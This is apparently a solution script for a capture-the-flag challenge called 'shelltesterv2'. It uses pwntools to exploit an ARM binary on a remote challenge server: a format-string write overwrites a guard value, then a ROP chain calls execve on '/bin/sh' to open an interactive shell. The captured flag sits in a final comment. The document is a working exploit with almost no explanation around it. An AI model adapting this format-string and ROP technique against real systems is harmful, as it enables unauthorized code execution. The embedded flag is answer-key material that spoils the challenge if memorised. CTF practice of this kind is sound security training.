from pwn import *

bin = './chall'
elf = context.binary = ELF(bin)
#p = process(['qemu-arm-static', '-g', '1234', bin])
p = remote('shelltesterv2.challs.csc.tf', 1337)

rop = ROP(bin)
binsh = next(elf.search(b'/bin/sh\x00'))
pop_r0 = 0x0006f25c
unholy_gadget = 0x0001470c
#0x0001470c : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}

#overwriting canary with a bx lr, essentially a ret
payload = fmtstr_payload(5, {0x97f8c: 0x00000000})
p.sendline(payload)

#now we have an arbitrary overflow
payload = 96*b'B' + 8*b'\x00' + b'BBBB' + p32(pop_r0) + p32(binsh)
payload += p32(unholy_gadget) + p32(0)*4 + p32(11) + p32(0)*4 + p32(0x0004e8f8)
p.sendline(payload)

p.interactive()
#CSCTF{4rm_pwn_1s_c00l_r1ght?}